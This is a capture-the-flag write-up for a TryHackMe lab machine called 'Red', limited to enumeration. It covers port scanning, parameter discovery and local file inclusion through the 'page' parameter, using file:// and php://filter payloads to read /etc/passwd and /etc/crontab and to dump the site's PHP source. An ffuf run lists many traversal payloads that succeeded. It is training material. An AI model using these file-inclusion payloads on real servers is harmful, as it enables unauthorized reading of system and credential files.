# Red — Writeup

## Overview
### Red — Writeup
### Red — Writeup
----
A classic battle for the ages.
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/02262ebcc025ce939f26d08836df0fca.png)
Start Machine
The match has started, and Red has taken the lead on you.
But you are Blue, and only you can take Red down.
However, Red has implemented some defense mechanisms that will make the battle a bit difficult:
1. Red has been known to kick adversaries out of the machine. Is there a way around it?
2. Red likes to change adversaries' passwords but tends to keep them relatively the same.
3. Red likes to taunt adversaries in order to throw off their focus. Keep your mind sharp!
This is a unique battle, and if you feel up to the challenge. Then by all means go for it!
Whenever you are ready, click on the **Start Machine** button to fire up the Virtual Machine.
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.60.213 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.60.213:22
Open 10.10.60.213:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.60.213 [2 ports]
Discovered open port 22/tcp on 10.10.60.213
Discovered open port 80/tcp on 10.10.60.213
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.60.213
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.60.213.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.60.213
Host is up, received user-set (0.19s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2741ce0f7864d6946f65b4dbec39f76 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1MTQvnXh8VLRlrK8tXP9JEHtHpU13E7cBXa1XFM/TZrXXpffMfJneLQvTtSQcXRUSvq3Z3fHLk4xhM1BEDl+XhlRdt+bHIP4O5Myk8qLX9E1FFpcy3NrEHJhxCCY/SdqrK2ZXyoeld1Ww+uHpP5UBPUQQZNypxYWDNB5K0tbDRU+Hw+p3H3BecZwue1J2bITy6+Y9MdgJKKaVBQXHCpLTOv3A7uznCK6gLEnqHvGoejKgFXsWk8i5LJxJqsHtQ4b+AaLS9QAy3v9EbhSyxAp7Zgcz0t7GFRgc4A5LBFZL0lUc3s++AXVG0hJ9cdVTBl282N1/hF8PG4T6JjhOVX955sEBDER4T6FcCPehqzCrX0cEeKX6y6hZSKnT4ps9kaazx9O4slrraF83O9iooBTtvZ7iGwZKiCwYFOofaIMv+IPuAJJuRT0156NAl6/iSHyUM3vD3AHU8k7OISBkndyAlvYcN/ONGWn4+K/XKxkoXOCW1xk5+0sxdLfMYLk2Vt8=
|   256 fb8473da6cfeb9195a6c654dd1723bb0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDooZFwx0zdNTNOdTPWqi+z2978Kmd6db0XpL5WDGB9BwKvTYTpweK/dt9UvcprM5zMllXuSs67lPNS53h5jlIE=
|   256 5e3775fcb364e2d8d6bc9ae67e604d3c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDyWZoVknPK7ItXpqVlgsise5Vaz2N5hstWzoIZfoVDt
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.66 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ arjun -u http://10.10.60.213
    _
   /_| _ '
  (  |/ /(//) v2.2.1
      _/      

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] parameter detected: page, based on: http code
[+] Parameters found: page

uhmm after lot of enumeration

Issue detail
The page parameter is vulnerable to path traversal attacks, enabling read access to arbitrary files on the server.  The payload file:///etc/passwd was submitted in the page parameter. The requested file was returned in the application's response. 

http://10.10.124.199/index.php?page=file:///etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin blue:x:1000:1000:blue:/home/blue:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false red:x:1001:1001::/home/red:/bin/bash 

http://10.10.124.199/index.php?page=file:///etc/hosts

127.0.0.1 localhost 127.0.1.1 red 192.168.0.1 redrules.thm # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouter 

http://10.10.124.199/index.php?page=file:///etc/hostname

red

http://10.10.124.199/index.php?page=file:///etc/crontab
```
```text
# /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed 17 * * * * root cd / && run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly ) # 

http://10.10.124.199/index.php?page=file:///etc/os-release

NAME="Ubuntu" VERSION="20.04.4 LTS (Focal Fossa)" ID=ubuntu ID_LIKE=debian PRETTY_NAME="Ubuntu 20.04.4 LTS" VERSION_ID="20.04" HOME_URL="https://www.ubuntu.com/" SUPPORT_URL="https://help.ubuntu.com/" BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/" PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy" VERSION_CODENAME=focal UBUNTU_CODENAME=focal 

http://10.10.124.199/index.php?page=php://filter/convert.base64-encode/resource=index.php

PD9waHAgCgpmdW5jdGlvbiBzYW5pdGl6ZV9pbnB1dCgkcGFyYW0pIHsKICAgICRwYXJhbTEgPSBzdHJfcmVwbGFjZSgiLi4vIiwiIiwkcGFyYW0pOwogICAgJHBhcmFtMiA9IHN0cl9yZXBsYWNlKCIuLyIsIiIsJHBhcmFtMSk7CiAgICByZXR1cm4gJHBhcmFtMjsKfQoKJHBhZ2UgPSAkX0dFVFsncGFnZSddOwppZiAoaXNzZXQoJHBhZ2UpICYmIHByZWdfbWF0Y2goIi9eW2Etel0vIiwgJHBhZ2UpKSB7CiAgICAkcGFnZSA9IHNhbml0aXplX2lucHV0KCRwYWdlKTsKICAgIHJlYWRmaWxlKCRwYWdlKTsKfSBlbHNlIHsKICAgIGhlYWRlcignTG9jYXRpb246IC9pbmRleC5waHA/cGFnZT1ob21lLmh0bWwnKTsKfQoKPz4K

<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>

┌──(witty㉿kali)-[~/Downloads]
└─$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://10.10.124.199/index.php?page=file:///FUZZ" -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.124.199/index.php?page=file:///FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

[Status: 200, Size: 7224, Words: 942, Lines: 228, Duration: 219ms]
    * FUZZ: /etc/apache2/apache2.conf

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 2297ms]
    * FUZZ: ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd

[Status: 200, Size: 2777, Words: 281, Lines: 50, Duration: 506ms]
    * FUZZ: /etc/apt/sources.list

[Status: 200, Size: 658, Words: 77, Lines: 13, Duration: 506ms]
    * FUZZ: /etc/fstab

[Status: 200, Size: 779, Words: 1, Lines: 60, Duration: 214ms]
    * FUZZ: /etc/group

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 2911ms]
    * FUZZ: /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

[Status: 200, Size: 242, Words: 23, Lines: 11, Duration: 190ms]
    * FUZZ: ../../../../../../../../../../../../etc/hosts

[Status: 200, Size: 242, Words: 23, Lines: 11, Duration: 190ms]
    * FUZZ: /etc/hosts

[Status: 200, Size: 711, Words: 128, Lines: 18, Duration: 188ms]
    * FUZZ: /etc/hosts.deny

[Status: 200, Size: 411, Words: 82, Lines: 11, Duration: 188ms]
    * FUZZ: /etc/hosts.allow

[Status: 200, Size: 8181, Words: 1500, Lines: 356, Duration: 187ms]
    * FUZZ: /etc/init.d/apache2

[Status: 200, Size: 26, Words: 5, Lines: 3, Duration: 191ms]
    * FUZZ: /etc/issue

[Status: 200, Size: 510, Words: 131, Lines: 21, Duration: 191ms]
    * FUZZ: /etc/nsswitch.conf

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 190ms]
    * FUZZ: /./././././././././././etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 187ms]
    * FUZZ: ../../../../../../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 188ms]
    * FUZZ: /etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: /../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 187ms]
    * FUZZ: ../../../../../../../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 187ms]
    * FUZZ: ../../../../../../../../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: ../../../../../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 3917ms]
    * FUZZ: ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: ../../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: ../../../../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 190ms]
    * FUZZ: ../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: ../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: ../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 190ms]
    * FUZZ: ../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 190ms]
    * FUZZ: ../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 188ms]
    * FUZZ: ../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 190ms]
    * FUZZ: ../../../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 191ms]
    * FUZZ: ../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 191ms]
    * FUZZ: ../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 191ms]
    * FUZZ: ../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 192ms]
    * FUZZ: ../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 191ms]
    * FUZZ: ../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 191ms]
    * FUZZ: ../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 191ms]
    * FUZZ: ../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: ../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: ../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 190ms]
    * FUZZ: etc/passwd

[Status: 200, Size: 1042, Words: 181, Lines: 23, Duration: 3141ms]
    * FUZZ: /etc/crontab

[Status: 200, Size: 751, Words: 99, Lines: 20, Duration: 188ms]
    * FUZZ: /etc/resolv.conf

[Status: 200, Size: 887, Words: 36, Lines: 41, Duration: 188ms]
    * FUZZ: /etc/rpc

[Status: 200, Size: 3336, Words: 297, Lines: 126, Duration: 189ms]
    * FUZZ: /etc/ssh/sshd_config

[Status: 200, Size: 2128, Words: 263, Lines: 57, Duration: 188ms]
    * FUZZ: /proc/cpuinfo

[Status: 200, Size: 1475, Words: 528, Lines: 54, Duration: 189ms]
    * FUZZ: /proc/meminfo

[Status: 200, Size: 27, Words: 5, Lines: 2, Duration: 189ms]
    * FUZZ: /proc/loadavg

[Status: 200, Size: 1910, Words: 872, Lines: 36, Duration: 189ms]
    * FUZZ: /proc/interrupts

